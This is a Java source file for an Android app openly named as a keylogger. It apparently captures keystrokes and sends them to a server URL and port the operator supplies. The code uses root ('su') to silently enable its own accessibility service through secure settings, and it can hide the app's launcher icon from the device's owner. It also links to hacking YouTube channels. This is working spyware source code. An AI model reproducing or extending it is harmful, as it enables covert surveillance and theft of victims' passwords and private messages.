package com.mr.programmerlab.androidkeylogger;

import android.annotation.SuppressLint;
import android.app.ActivityOptions;
import android.app.Dialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Looper;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;

import android.os.Bundle;
import android.util.Log;
import android.util.Pair;
import android.view.LayoutInflater;
import android.view.View;
import android.view.accessibility.AccessibilityEvent;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Switch;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.util.List;

import mr.programmerlab.androidkeylogger.MyService;
import mr.programmerlab.androidkeylogger.R;

@SuppressLint("UseSwitchCompatOrMaterialCode")
public class MainActivity extends AppCompatActivity {
    public Keylogger k = new Keylogger();
    public Button b1,b2,b3,b4;
    public Switch sw;
    public CardView c;
    final Context context = this;
    SharedPreferences  prefs ;
    CheckBox dialogcb;
    SharedPreferences.Editor ed ;
    CardView bgc1,bgc2;
    ImageView i1,i2;
    Button l1,l2;


    @SuppressLint("StaticFieldLeak")
    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // this method is executed in a background thread
            // no problem calling su here
            enableAccessibility();
            return null;
        }
    }


    @SuppressLint("SetJavaScriptEnabled")
    private void showdialog() {
        final Dialog dialog = new Dialog(this);
        dialog.setContentView(R.layout.disclaimer);
        dialog.setTitle("Disclaimer");
        final Button dialogButton =dialog.findViewById(R.id.button5);
        dialogcb=dialog.findViewById(R.id.checkBox);
        WebView wv;
        wv=dialog.findViewById(R.id.disss);
        wv.getSettings().setJavaScriptEnabled(true);
        wv.loadUrl("file:///android_asset/index.html");
        dialogButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                if(!dialogcb.isChecked()){
                    Toast.makeText(context,"Please Accept the Disclaimer to Continue!!!",Toast.LENGTH_SHORT).show();
                }
                else{
                    SharedPreferences.Editor edit=prefs.edit();
                    edit.putBoolean("show_again",!dialogcb.isChecked());
                    edit.apply();
                    dialog.dismiss();
                }
            }
        });
        dialog.show();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("MainActivity", "onCreate");
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("detail", MODE_PRIVATE);
        boolean isshowagain =prefs.getBoolean("show_again", true);
        if(isshowagain)
            showdialog();
        b1 = findViewById(R.id.button);
        k.url = "url";
        b1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                LayoutInflater li;
                li = LayoutInflater.from(context);
                View promptsView = li.inflate(R.layout.prompt_box, null);

                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
                        context);

                // set prompts.xml to alertdialog builder
                alertDialogBuilder.setView(promptsView);

                final EditText userInput = promptsView
                        .findViewById(R.id.editTextDialogUserInput);
                sw=promptsView.findViewById(R.id.toggle);
                sw.setChecked(prefs.getBoolean("checked",false));

                // set dialog message
                alertDialogBuilder
                        .setCancelable(false)
                        .setPositiveButton("OK",
                                new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog,int id) {
                                        // get user input and set it to result
                                        // edit text
                                        k.url=userInput.getText().toString();
                                        appLogo(sw.isChecked());
                                    }
                                })
                        .setNegativeButton("Cancel",
                                new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog,int id) {
                                        dialog.cancel();
                                    }
                                });

                // create alert dialog
                AlertDialog alertDialog = alertDialogBuilder.create();

                // show it
                alertDialog.show();
            }
        });
        b2=findViewById(R.id.button2);
        b2.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                startService(new Intent(getApplicationContext(), MyService.class));
                start();
            }
        });
        b3=findViewById(R.id.button3);
        b3.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("https://www.youtube.com/c/MrProgrammerSharmaJi"));
                intent.setPackage("com.google.android.youtube");
                PackageManager manager = getPackageManager();
                List<ResolveInfo> info = manager.queryIntentActivities(intent, 0);
                if (info.size() > 0) {
                    startActivity(intent);
                } else {
                    intent.setPackage("com.android.chrome");
                    startActivity(intent);
                }
            }
        });
        b4=findViewById(R.id.button4);
        b4.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("https://www.youtube.com/c/Hackingteachnology"));
                intent.setPackage("com.google.android.youtube");
                PackageManager manager = getPackageManager();
                List<ResolveInfo> info = manager.queryIntentActivities(intent, 0);
                if (info.size() > 0) {
                    startActivity(intent);
                } else {
                    intent.setPackage("com.android.chrome");
                    startActivity(intent);
                }
            }
        });
        c=findViewById(R.id.Profiling);
        c.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                bgc1=findViewById(R.id.Profiling);
                bgc2=findViewById(R.id.Profilingx);
                l1=findViewById(R.id.button3);
                l2=findViewById(R.id.button4);
                i1=findViewById(R.id.imageView);
                i2=findViewById(R.id.image2);

                Intent about = new Intent(MainActivity.this,About.class);


                Pair[] pairs = new Pair[6];
                pairs[0] = new Pair<View, String>(bgc1, "bgbanner");
                pairs[1] = new Pair<View, String>(bgc2, "logobg");
                pairs[2] = new Pair<View, String>(l1, "logo1");
                pairs[3] = new Pair<View , String>(l2, "logo2");
                pairs[4] = new Pair<View , String>(i1, "banner");
                pairs[5] = new Pair<View , String>(i2, "appnameIcon");

                ActivityOptions options = ActivityOptions.makeSceneTransitionAnimation(MainActivity.this, pairs);

                startActivity(about,options.toBundle());
            }
        });
    }
    @SuppressLint("UseCompatLoadingForDrawables")
    protected void start(){
        if(!k.url.equals("url")){
            b2.setBackgroundResource(R.drawable.running);
            try{
                Startup startup = new Startup();
                startup.doInBackground();
                Toast.makeText(context, "Service Started!!!", Toast.LENGTH_SHORT).show();
                k.onServiceConnected();
                k.onAccessibilityEvent(AccessibilityEvent.obtain());
            }
            catch(Exception e){
                Toast.makeText(context,"Some Errors: "+ e,Toast.LENGTH_SHORT).show();
                b2.setBackgroundResource(R.drawable.button);
            }
        }
        else{
            Toast.makeText(context,"Please Define A port to connect",Toast.LENGTH_SHORT).show();
        }

    }

    void enableAccessibility(){
        Log.d("MainActivity", "enableAccessibility");
        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.d("MainActivity", "on main thread");
            // running on the main thread
        } else {
            Log.d("MainActivity", "not on main thread");
            // not running on the main thread
            try {
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services com.mr.programmerlab.androidkeylogger.Keylogger\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();

                process.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void appLogo(boolean b){
        if(b){
            ed =  prefs.edit();
            ed.putBoolean("checked",b);
            ed.apply();
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, Splash.class);
            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }
        if(!b){
            ed =  prefs.edit();
            ed.putBoolean("checked",b);
            ed.apply();
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, Splash.class);
            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        }
    }
}
